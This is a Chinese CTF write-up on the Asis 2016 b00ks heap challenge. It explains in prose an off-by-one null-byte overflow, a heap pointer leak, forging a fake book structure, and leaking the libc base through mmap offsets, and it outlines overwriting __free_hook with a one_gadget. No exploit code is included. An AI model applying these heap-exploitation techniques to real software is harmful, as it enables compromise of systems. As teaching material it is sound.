堆溢出的Off-By-One

一、例题

[Asis_2016_b00ks](ctf-challenges/pwn/linux/user-mode/heap/off_by_one/Asis_2016_b00ks at master · ctf-wiki/ctf-challenges)

题目是一个 book 管理程序，有6个选项，通过分配堆存储信息。题目的漏洞在特别细微的地方，仔细看其中自定义的输入函数，它循环中的判断会在判定结束后读入’\0’，导致Off-By-One。

可以看到，计数器 local_14 从 0 开始计数，直到 local_14 达到 size 会写入NULL，实际上是读取了 size+1 字节。

在其他地方作者有意识的避免 off-by-one，比如iVar1 = My_Read(ptr_description,size + -1);，通过输入 size-1 平衡 My_Read 里的溢出，不过在 auther_name 这里忘记去 -1，导致实际读入 33 字节。

上面就是这道题最核心的漏洞，在继续漏洞利用之前，先说明一下整个get shell思路(更具体之后会写)：

  1. malloc分配堆有两种方式，brk 和 mmap，调试发现 mmap 分配的内存地址和 libc 基址存在固定偏移，我们希望通过泄露 mmap 分配的内存地址推知 libc 基址。

    （在泄露 mmap 分配内存地址之前需要先泄露一个堆指针，以便找到 mmap 具体位置）

  2. 得到 libc 基址后我们就可以找到 __free_hook 变量地址和 one_gadget 地址。

    （注：原环境glibc 2.27，高版本 hook 被移除）

  3. 然后我们希望将 one_gadget 地址写入 __free_hook处，并将 __free_hook地址当作指针去 free，即可执行 one_gadget

二、调试

（一）泄露堆指针

我们来看PTR_DAT_00302018这个指针。

PTR_Array 是一个指针数组，可以发现，PTR_Array 指向 DAT_00302060，PTR_DAT_00302018 指向 DAT_00302040，两者相差32字节，所以，My_Read 的一字节NULL溢出会溢出到 PTR_Array 第一个指针指向的地址。

来看 PTR_Array 这里的反编译。 local_20 指向分配的堆，并且PTR_Array第一项刚好local_20 。在 Create a book 选项，会向堆读入数据，然而，之前溢出的NULL刚好被读入的数据覆盖，也就是说， author name 将没有结束符，在 printf 时会连带着将后面数据泄露出来。

具体关系如下图，PTR_Array就是一个指针数组，指向bss段，存储各个结构体指针(local_20)。PTR_Array中第一个指针就是local_20， local_20上面就是Author，NULL溢出并覆盖后 printf 连带泄露的就是 local_20指针。

这里用 *name 以区分指针和数据，并非解引用

如下构造payload，我们先输入32字节数据，实际上是33字节，有一个NULL溢出到下一个位置，之后1. Create a book选项读入数据刚好覆盖掉NULL，导致 author name 后没有结束符，然后4. Print book detail选项，Author项的 printf 会带出第一个指针。

此过程完成了堆指针的泄露。接下来讲解 mmap 内存地址泄露。

（二）泄露 mmap

我们来gdb调试查看，Create a book选项申请了三个堆块，在选项完成后中断。这里堆块的Size是0x30，刚好是我们申请0x20的堆块大小 加上0x10的chunk header。

明显这三个堆是连续的，我们来看一下堆的详细内容。

可以看到每个堆块的前0x10字节作为chunk header，包括前8字节的 prev_size 以及后8字节的 size，之后便是可以使用的 user data。根据里面的数据推断，每个 chunk 的内容如上图。

重点在 chunk3，很明显这就是一个 book 的结构体，0x555555603710 作为 malloc(0x20) 返回的 user_ptr (即上述local_20) 存储在指针数组PTR_Array里。根据之前Off-By-One解释，这里作为PTR_Array的第一个指针，其最低字节可以被NULL覆盖，也就是说我们可以将此指针低字节置0，使其指向更低地址处。

对于此处，0x555555603710 (local_20) 低字节置零后为 0x555555603700，相当于向上偏移0x10。此时 local_20 指向chunk header，如果继续执行程序会将一部分非指针数据当作指针去寻址，导致 Segmentation fault。很明显这样溢出没有意义。

我们知道，首次连续申请的堆块在内存上是连续的，上图也证明了这一点。其中 chunk1(name) 和 chunk2(description) 的大小是由用户来控制的，如果我们申请的 chunk1 和 chunk2 更大一些，让 chunk2 返回指针的末尾字节刚好是 0x700，这样当我们将 local_20 低字节置零后，local_20 刚好指向 chunk2 ，并且如果我们在置零前在 chunk2(description) 部分提前伪造好一个 chunk3 的结构体，其中指针由攻击者控制，于是就可以获得任意地址读写的能力。此处”任意地址读”靠已有的 printf(…) 部分实现.

这里用 *name 以区分指针和数据，并非解引用。

ctf-wiki上提供了一种非常巧妙的 libc 地址泄漏方法，即mmap 分配的内存与 libc 之间的偏移是固定的

我们知道，malloc 分配内存有两种方式，当 malloc 申请非常大的内存（通常大于 128KB）时，不使用传统的堆（brk 扩展），而是调用 mmap() 系统调用单独映射一块内存。

简单来讲，brk 扩展就是从 Top chunk 分割一个块，其位置还是在堆区域；而 mmap 映射则是由内核决定这块内存的位置。

下面我们 gdb 调试观察 mmap 分配的内存区域。为了区分结构体堆块和用户申请堆块，我们创建第一本书时将 name_size 和 desc_size 设置成16字节。创建第二本书时将 name_size 和 desc_size 设置成 2000000 字节(触发mmap)。

我们创建两本书，malloc 共申请了6次，但这里只有4个堆块。可以看到前三个堆块就是我们的 book1，而 book2 申请的两个超大内存并不在堆区域，只有 book2 结构体存储的块。

我们来看 book2 结构体，很明显，size 部分 0x00000000001e8480 正是我们申请的 2000000字节内存大小，而 0x00007ffff7a17010 和 0x00007ffff782e010 则是我们申请的name和description内存区域。

我们通过 vmmap 可以更清晰的看到 mmap 分配的内存。

下面验证一下 mmap 分配的内存与 libc 之间的偏移是否固定。

为方便调试，gdb默认关闭ASLR，我们可以通过set disable-randomization off开启ASLR

计算可知，偏移都是0x3d2000，确实固定。

接下来泄露 mmap。根据上面的调试，我们可以发现 mmap 分配内存的地址存储在第四个chunk里。之前我们泄露的堆指针派上了用场，由于堆块是邻接的，于是我们就可以计算出那个堆指针相对于存储mmap地址的地址的偏移，再通过 editbook 将这个新地址读取到我们伪造的 book1 结构体 *name 和 *description 部分，然后 printbook 就会将两个地址输出（其实只需要一个地址，只是占位用），通过输出即可推知 libc 基址。
